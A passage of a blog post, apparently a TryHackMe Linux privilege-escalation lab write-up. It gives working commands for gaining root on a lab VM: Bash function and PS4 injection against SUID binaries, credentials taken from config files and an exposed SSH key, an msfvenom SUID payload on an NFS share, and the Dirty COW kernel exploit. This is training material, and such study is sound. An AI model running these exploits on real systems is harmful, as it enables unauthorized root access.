strings /usr/local/bin/suid-env2
```

In Bash versions \<4.2--048 it is possible to define shell functions
with names that resemble file paths, then export those functions so that
they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than
4.2--048:

``` {#6752 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
/bin/bash --version
```

Create a Bash function with the name "/usr/sbin/service" that executes a
new Bash shell (using -p so permissions are preserved) and export the
function:

``` {#a6ab .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

Run the suid-env2 executable to gain a root shell:

``` {#a9b5 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
/usr/local/bin/suid-env2
```

<figure id="ba9f" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Zpz54ghs-jZAhbY9.png"
class="graf-image" data-image-id="0*Zpz54ghs-jZAhbY9.png"
data-width="671" data-height="138" />
</figure>

### Task 15: SUID / SGID Executables -Abusing Shell Features (#2) {#24f9 .graf .graf--h3 .graf-after--figure name="24f9"}

so, in bash versions less than 4.4 and above, we could define the PS4
variable to display an extra prompt for debugging statements in
debugging mode.

<figure id="0ad2" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Q_f_EF6JixwFmnhq.png"
class="graf-image" data-image-id="0*Q_f_EF6JixwFmnhq.png"
data-width="1250" data-height="641" />
</figure>

*Note: This will not work on Bash versions 4.4 and above.*

When in debugging mode, Bash uses the environment variable **PS4** to
display an extra prompt for debugging statements.

Run the **/usr/local/bin/suid-env2** executable with bash debugging
enabled and the PS4 variable set to an embedded command which creates an
SUID version of /bin/bash:

``` {#59e4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

Run the /tmp/rootbash executable with -p to gain a shell running with
root privileges:

``` {#ac73 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
/tmp/rootbash -p
```

**Remember to remove the /tmp/rootbash executable and exit out of the
elevated shell before continuing as you will create this file again
later in the room!**

``` {#c141 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
rm /tmp/rootbash
exit
```

<figure id="9200" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*MIAcEQN43hETJ-0f.png"
class="graf-image" data-image-id="0*MIAcEQN43hETJ-0f.png"
data-width="675" data-height="285" />
</figure>

### Task 16: Passwords & Keys -History Files {#1220 .graf .graf--h3 .graf-after--figure name="1220"}

<figure id="e1f7" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*oRHCAsB2GsxbBg4d.png"
class="graf-image" data-image-id="0*oRHCAsB2GsxbBg4d.png"
data-width="482" data-height="155" />
</figure>

Switch to the root user, using the password:

``` {#4755 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
su root
```

### Task 17: Passwords & Keys -Config Files {#ff7a .graf .graf--h3 .graf-after--pre name="ff7a"}

Config files often contain passwords in plaintext or other reversible
formats.

List the contents of the user's home directory:

``` {#2b54 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
ls /home/user
```

Note the presence of a myvpn.ovpn config file. View the contents of the
file:

``` {#7f43 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
cat /home/user/myvpn.ovpn
```

The file should contain a reference to another location where the root
user's credentials can be found. Switch to the root user, using the
credentials:

``` {#69db .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
su root
```

<figure id="0e4f" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*nvc83qq9dqdtQ3tb.png"
class="graf-image" data-image-id="0*nvc83qq9dqdtQ3tb.png"
data-width="512" data-height="647" />
</figure>

**Q.1:** What file did you find the root user's credentials in?

> ***Answer: /etc/openvpn/auth.txt***

### Task 18: Passwords & Keys -SSH Keys {#e079 .graf .graf--h3 .graf-after--blockquote name="e079"}

Sometimes users make backups of important files but fail to secure them
with the correct permissions.

Look for hidden files & directories in the system root:

`ls -la /`{.markup--code .markup--p-code}

Note that there appears to be a hidden directory called **.ssh**. View
the contents of the directory:

`ls -l /.ssh`{.markup--code .markup--p-code}

Note that there is a world-readable file called **root_key**. Further
inspection of this file should indicate it is a private SSH key. The
name of the file suggests it is for the root user.

Copy the key over to your Kali box (it's easier to just view the
contents of the **root_key** file and copy/paste the key) and give it
the correct permissions, otherwise your SSH client will refuse to use
it:

`chmod 600 root_key`{.markup--code .markup--p-code}

Use the key to login to the Debian VM as the root account (change the IP
accordingly):

`ssh -i root_key root@10.10.10.10`{.markup--code .markup--p-code}

**Remember to exit out of the root shell before continuing!**

<figure id="8741" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*jLK_ya0QQPjzUktt.png"
class="graf-image" data-image-id="0*jLK_ya0QQPjzUktt.png"
data-width="595" data-height="606" />
</figure>

copy the key to kali linux

<figure id="cb9f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*jaaVb6i8blWHjs_8.png"
class="graf-image" data-image-id="0*jaaVb6i8blWHjs_8.png"
data-width="663" data-height="379" />
</figure>

<figure id="64ab" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*3xvqwuTLvMUduf_N.png"
class="graf-image" data-image-id="0*3xvqwuTLvMUduf_N.png"
data-width="743" data-height="435" />
</figure>

### Task 19 --- NFS {#f852 .graf .graf--h3 .graf-after--figure name="f852"}

Files created via NFS inherit the **remote** user's ID. If the user is
root, and root squashing is enabled, the ID will instead be set to the
"nobody" user.

Check the NFS share configuration on the Debian VM:

**On the server**

``` {#307f .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
cat /etc/exports
```

<figure id="123a" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*znlnWvAjxarBs3C8.png"
class="graf-image" data-image-id="0*znlnWvAjxarBs3C8.png"
data-width="872" data-height="390" />
</figure>

Note that the **/tmp** share has root squashing disabled.

On your Kali box, switch to your root user if you are not already
running as root:

``` {#2cf0 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
sudo su
```

Using Kali's root user, create a mount point on your Kali box and mount
the **/tmp** share (update the IP accordingly):

``` {#fe25 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
```

Still using Kali's root user, generate a payload using **msfvenom** and
save it to the mounted share (this payload simply calls /bin/bash):

``` {#e441 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

Still using Kali's root user, make the file executable and set the SUID
permission:

**On the workstation**

``` {#7f5b .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
chmod +xs /tmp/nfs/shell.elf
```

<figure id="7467" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*O7uBQyV4AGsAzWGo.png"
class="graf-image" data-image-id="0*O7uBQyV4AGsAzWGo.png"
data-width="818" data-height="557" />
</figure>

Back on the Debian VM, as the low privileged user account, execute the
file to gain a root shell:

``` {#dad2 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
/tmp/shell.elf
```

**Remember to exit out of the root shell before continuing!**

**On the server**

<figure id="6f2a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*z2OnmZTbYAPfQFhB.png"
class="graf-image" data-image-id="0*z2OnmZTbYAPfQFhB.png"
data-width="758" data-height="204" />
</figure>

**Q.1:** What is the name of the option that disables root squashing?

> ***Answer: no_root_squash***

### Task 20: Kernel Exploits {#036e .graf .graf--h3 .graf-after--blockquote name="036e"}

Kernel exploits can leave the system in an unstable state, which is why
you should only run them as a last resort.

Run the **Linux Exploit Suggester 2** tool to identify potential kernel
exploits on the current system:

``` {#25fc .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

The popular Linux kernel exploit "Dirty COW" should be listed. Exploit
code for Dirty COW can be found at
**/home/user/tools/kernel-exploits/dirtycow/c0w.c**. It replaces the
SUID file /usr/bin/passwd with one that spawns a shell (a backup of
/usr/bin/passwd is made at /tmp/bak).

Compile the code and run it (note that it may take several minutes to
complete):

``` {#430e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```

Once the exploit completes, run /usr/bin/passwd to gain a root shell:

``` {#6bf4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
/usr/bin/passwd
```

Remember to restore the original /usr/bin/passwd file and exit the root
shell before continuing!

``` {#770c .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
mv /tmp/bak /usr/bin/passwd
exit
```

<figure id="45d6" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*ch3-AIvSfOa5Tzbs.png"
class="graf-image" data-image-id="0*ch3-AIvSfOa5Tzbs.png"
data-width="875" data-height="544" />
</figure>

<figure id="b43c" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*ycHpRZf-0JnnQVbU.png"
class="graf-image" data-image-id="0*ycHpRZf-0JnnQVbU.png"
data-width="875" data-height="503" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#eabb .graf .graf--h3 .graf-after--figure name="eabb"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#8e1d .graf .graf--h3 .graf-after--p name="8e1d"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 17, 2024](https://medium.com/p/224b48e7d168).

[Canonical
link](https://medium.com/@bevijaygupta/linux-privesc-tryhackme-writeup-224b48e7d168){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
